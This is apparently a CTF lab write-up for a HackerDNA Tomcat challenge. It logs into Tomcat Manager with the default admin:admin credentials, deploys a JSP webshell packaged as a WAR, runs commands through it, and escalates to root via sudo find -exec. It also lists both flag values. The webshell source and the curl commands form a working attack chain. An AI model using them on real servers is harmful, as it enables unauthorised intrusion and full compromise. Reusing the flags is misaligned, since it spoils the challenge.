---
layout: default
title: Compromised 1 - Apache Tomcat Default Credentials to WAR Deploy RCE
description: CTF writeup exploiting default admin:admin credentials on Apache Tomcat 9.0.96 Manager to deploy a malicious WAR file for RCE, then privilege escalation via sudo-allowed find binary.
category: hackerdna
tags: [web, ctf, hackerdna, tomcat, rce, war-deployment, sudo, privesc, gtfoBins]
---

# Compromised 1 - CTF Writeup

**Category:** WEB | **Flags:** 2 (User + Root)

Challenge: [https://hackerdna.com](https://hackerdna.com)

## Contents

- [Reconnaissance](#reconnaissance)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)

## Reconnaissance

Nmap scan reveals two open ports:

- **80** - HTTP (Apache 2.4.65) - Static "Server is Running" page
- **8080** - HTTP (Apache Tomcat 9.0.96) - Default Tomcat welcome page

Tomcat 9.0.96 has the Manager webapp at `/manager/html` with HTTP Basic Authentication.

## Exploitation

### Step 1 - Default Credentials

The Tomcat Manager login accepts default credentials:

```bash
curl -u "admin:admin" "http://TARGET:8080/manager/html"
# HTTP 200 - Access granted
```

The admin user has the `manager-gui` role, granting access to the HTML management interface.

### Step 2 - Deploy Malicious WAR

Create a JSP webshell and package it as a WAR file:

```bash
python3 -c "
import zipfile
with zipfile.ZipFile('cmd.war', 'w', zipfile.ZIP_DEFLATED) as war:
    war.writestr('cmd.jsp', '''<%@ page import=\"java.io.*\" %>
<%
String cmd = request.getParameter(\"cmd\");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>''')
```

Extract the CSRF nonce from the manager page and upload the WAR:

```bash
JSESSIONID="..."
NONCE="..."

curl -u "admin:admin" \
  -F "deployWar=@cmd.war;filename=cmd.war" \
  -F "deploy=Deploy" \
  -F "path=/cmd" \
  -F "org.apache.catalina.filters.CSRF_NONCE=$NONCE" \
  "http://TARGET:8080/manager/html/upload"
```

### Step 3 - Remote Code Execution

Access the deployed webshell:

```bash
curl -s "http://TARGET:8080/cmd/cmd.jsp?cmd=id"
# uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
```

### Step 4 - User Flag

```bash
curl -s "http://TARGET:8080/cmd/cmd.jsp?cmd=cat%20/home/flag-user.txt"
# b457739f-aa29-e795-02a4-647e25b2a7ff
```

**User Flag:** `b457739f-aa29-e795-02a4-647e25b2a7ff`

## Privilege Escalation

### Sudo Enumeration

```bash
curl -s "http://TARGET:8080/cmd/cmd.jsp?cmd=sudo%20-l"
# User hacker may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/find
```

### GTFOBins - find

The `find` binary with NOPASSWD sudo allows executing any command as root via the `-exec` flag:

```bash
curl -s "http://TARGET:8080/cmd/cmd.jsp?cmd=sudo%20/usr/bin/find%20-exec%20cat%20/root/flag-root.txt%20%5C%3B%20-quit"
# 28bc8d09-1a64-4a4b-3ec2-5eedbff89857
```

**Root Flag:** `28bc8d09-1a64-4a4b-3ec2-5eedbff89857`
